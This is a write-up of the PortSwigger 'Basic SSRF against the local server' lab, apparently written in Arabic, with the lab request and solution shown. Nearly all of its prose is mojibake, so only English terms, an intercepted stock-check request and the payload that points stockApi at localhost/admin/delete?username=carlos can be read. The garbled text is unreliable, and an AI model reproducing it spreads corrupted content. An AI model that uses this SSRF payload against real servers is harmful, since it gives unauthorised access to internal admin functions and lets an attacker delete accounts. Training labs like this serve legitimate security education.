# [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)

- **ุงูุฏุฑุฌุฉ:** APPRENTICE
    
- **ุงูุญุงูุฉ:** Solved โ
    
- **ุงููุฏู:** ุงููุตูู ูููุญุฉ ุงูุชุญูู (Admin Interface) ูุญุฐู ุงููุณุชุฎุฏู `carlos` ูู ุฎูุงู ุงุณุชุบูุงู ุซุบุฑุฉ SSRF.

## ๐ ุงูุงุณุชูุดุงู (Exploration)

ุจุนุฏ ุงูุฏุฎูู ุนูู ุงููุนูู (Lab)ุ ููุช ุจูุญุต ููุฒุฉ **Check Stock** ุงูููุฌูุฏุฉ ูู ุตูุญุฉ ุงูููุชุฌุงุช. ูุงุญุธุช ุฃู ุงูุณูุฑูุฑ ูููู ุจุฅุฑุณุงู ุทูุจ (HTTP Request) ุฅูู ูุธุงู ุฏุงุฎูู ูุฌูุจ ุญุงูุฉ ุงููุฎุฒูู.

ุนูุฏ ุงุนุชุฑุงุถ ุงูุทูุจ ุจุงุณุชุฎุฏุงู Burp Suiteุ ูุฌุฏุช ุฃู ุงูุจุงุฑุงููุชุฑ ุงููุณุฆูู ุนู ุงูุทูุจ ูู `stockApi`:

HTTP

```
POST /product/stock HTTP/1.1
Host: portswigger.net
...
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

---

## ๐๏ธ ุงูุงุณุชุบูุงู (Exploitation)

ุงูุซุบุฑุฉ ููุง ูู ุฃู ุงูุณูุฑูุฑ ูุซู ูู ุงููููุฉ ุงูููุฌูุฏุฉ ูู `stockApi` ููููู ุจุชูููุฐ ุงูุทูุจ ููุงุจุฉู ุนูุง. ููุช ุจุชุนุฏูู ูุฐุง ุงููุณุงุฑ ููููู ุงูุณูุฑูุฑ ุจุทูุจ ุฑุงุจุท ุฏุงุฎูู ูุง ูููููุง ุงููุตูู ุฅููู ูุจุงุดุฑุฉ ูู ุงููุชุตูุญ ุงูุฎุงุฑุฌู.

### ุงูุฎุทูุงุช:

1. ููุช ุจุชุนุฏูู ูููุฉ ุงูู `stockApi` ูุชูุฌู ุงูุทูุจ ุฅูู ุงูู Localhost (ุงูุณูุฑูุฑ ููุณู).
    
2. ุงุณุชูุฏูุช ูุณุงุฑ ุงูุญุฐู ุงูุฎุงุต ุจุงููุณุชุฎุฏู `carlos`.
    

ุงูู Payload ุงููุณุชุฎุฏู:

stockApi=http://localhost/admin/delete?username=carlos

---

## ๐ฏ ุงููุชูุฌุฉ (Result)

ุจูุฌุฑุฏ ุฅุฑุณุงู ุงูุทูุจ ุงููุนุฏู:

- ูุงู ุงูุณูุฑูุฑ ุจุชูููุฐ ุงูุฃูุฑ ูุญููุงู ููุฃูู ูุงุฏู ูู "ูุณุคูู ุงููุธุงู" (Admin).
    
- ุชู ุญุฐู ุงููุณุชุฎุฏู `carlos` ุจูุฌุงุญ.
    
- ุธูุฑุช ุฑุณุงูุฉ: **Congratulations, you solved the lab!**
    

---

> **ููุงุญุธุฉ ุฃูููุฉ:** ูุฐู ุงูุซุบุฑุฉ ุชุญุฏุซ ุจุณุจุจ ุนุฏู ูุฌูุฏ "ูุงุฆูุฉ ุจูุถุงุก" (Whitelist) ููุนูุงููู ุงูุชู ูุณูุญ ููุณูุฑูุฑ ุจุทูุจ ุงูุจูุงูุงุช ูููุงุ ููุง ูุณูุญ ููููุงุฌููู ุจุงููุตูู ููุฎุฏูุงุช ุงูุฏุงุฎููุฉ.
